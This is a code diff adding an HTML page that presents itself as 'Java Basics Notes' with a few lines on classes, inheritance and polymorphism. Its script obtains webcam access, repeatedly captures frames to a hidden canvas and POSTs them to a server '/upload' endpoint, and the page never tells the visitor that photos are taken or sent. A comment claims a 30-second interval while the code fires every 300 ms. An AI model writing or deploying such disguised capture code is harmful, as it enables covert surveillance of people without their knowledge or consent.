@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Java Notes</title>
+    <style>
+        body {
+            font-family: Arial;
+            margin: 40px;
+            line-height: 1.6;
+        }
+
+        #video {
+            width: 180px;
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            border: 2px solid #444;
+        }
+    </style>
+</head>
+
+<body>
+    <h1>Java Basics Notes</h1>
+    <p><strong>1. Class and Object:</strong> A class is a blueprint for objects...</p>
+    <p><strong>2. Inheritance:</strong> Java supports single inheritance using the "extends" keyword...</p>
+    <p><strong>3. Polymorphism:</strong> Polymorphism means having many forms, in Java we achieve it using overloading
+        and overriding.</p>
+    <p><strong>4. Abstraction:</strong> Hiding internal implementation using abstract classes or interfaces...</p>
+
+    <video id="video" autoplay muted></video>
+    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+
+    <script>
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        const context = canvas.getContext("2d");
+
+        // Access webcam
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then((stream) => {
+                video.srcObject = stream;
+
+                // Every 30 seconds, take photo
+                setInterval(() => {
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const imageData = canvas.toDataURL("image/png");
+
+                    // Send to server
+                    fetch("/upload", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ image: imageData })
+                    });
+                }, 300); // 30,000ms = 30s
+            })
+            .catch(() => {
+                alert("Please allow camera access.");
+            });
+    </script>
+</body>
+
+</html>
